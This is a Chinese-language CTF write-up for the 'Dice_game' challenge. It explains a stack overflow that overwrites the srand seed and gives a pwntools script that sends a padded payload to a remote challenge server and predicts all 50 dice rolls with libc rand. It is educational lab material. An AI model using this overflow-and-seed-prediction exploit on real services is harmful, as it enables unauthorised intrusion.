Dice_game-writeup

放进ida反编译：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[55]; // [rsp+0h] [rbp-50h]
  char v5; // [rsp+37h] [rbp-19h]
  ssize_t v6; // [rsp+38h] [rbp-18h]
  unsigned int seed[2]; // [rsp+40h] [rbp-10h]  #seed[0]距离buf 0x40,所以只要0x40个字符就可以溢出覆盖 seed 了 buf大小为0x55，可以读入0x50个字符，所以可以覆盖
  unsigned int v8; // [rsp+4Ch] [rbp-4h]

  memset(buf, 0, 0x30uLL);
  *(_QWORD *)seed = time(0LL);
  printf("Welcome, let me know your name: ", a2);
  fflush(stdout);
  v6 = read(0, buf, 0x50uLL);                  #read可以读入0x50个字符，可以覆盖到seed
  if ( v6 <= 49 )															 #有参数的read函数返回读入的字符数量
    buf[v6 - 1] = 0;                           #读的字符数量>49个酒不会触发这一行
  printf("Hi, %s. Let's play a game.\n", buf);
  fflush(stdout);
  srand(seed[0]);															 #c语言中rand函数只要有seed，之后随机的数字是可预见的
  v8 = 1;
  v5 = 0;
  while ( 1 )
  {
    printf("Game %d/50\n", v8);
    v5 = sub_A20();
    fflush(stdout);
    if ( v5 != 1 )
      break;
    if ( v8 == 50 )
    {
      sub_B28(buf);
      break;
    }
    ++v8;
  }
  puts("Bye bye!");
  return 0LL;
}
```

这里是引用主函数逻辑都在main函数中，在输入name的时候存在栈溢出，输入name后，会进入执行游戏的函数，大体猜数字，根据输入的数字和随机数生成的数字比较，猜对50次就给出flag

要把rand的seed设成我们知道的量，这样我们就能知道之后50个随机的数字是什么

rand()函数在lib文件中，所以我们只要用给的lib文件里的rand函数，先设好seed，然后得到之后随机的50个数，返回给服务器即可

```python
from pwn import *
from ctypes import * 

context.log_level='debug'
libc = cdll.LoadLibrary("libc.so.6")
#p = process('./dice_game')
 
p = remote("111.198.29.45",36187)
p.recvuntil(" let me know your name: ")
p.send("A" * 0x40 + p64(1))

libc.srand(1)
for i in range(50): 
  p.recvuntil("Give me the point(1~6): ")
  p.send(str(libc.rand()%6 + 1) + "\n")
 
p.interactive()
```

python用法：

`libc = cdll.LoadLibrary("libc.so.6")`

`libc.srand(1)`

`libc.rand()`



p.s.

理论上如果本地的libc是一样的话

可以自己用c写一个rand函数得到答案（但是没有用上面的方法保险）



### 关于rand() srand()

* 在使用rand()产生随机数时，产生的是0~RAND_MAX（该值与平台有关，至少为32767），之间的随机数，但其产生的随机数时伪随机数，默认随机数种子为0，所以每次重新运行程序，都会产生相同的随机数，如果要是每次运行时产生的随机数不同，可以以当前时间time(0)作为随机数种子。
* srand()重置随机数种子，以当前时间为参数。 c提供了srand()函数，原型为void srand(int a)。
  如果没调用srand()，你会发现你每次运行程序，rand()得到的序列值是不变的
  然后srand里参数相同是，rand() 得到的序列也将相同
* 0表示不存储time（）的返回值。
  time（）原型：time_t time（time_t *timer），返回值将存储在timer指定的位置，参数为0表示不存储返回值。


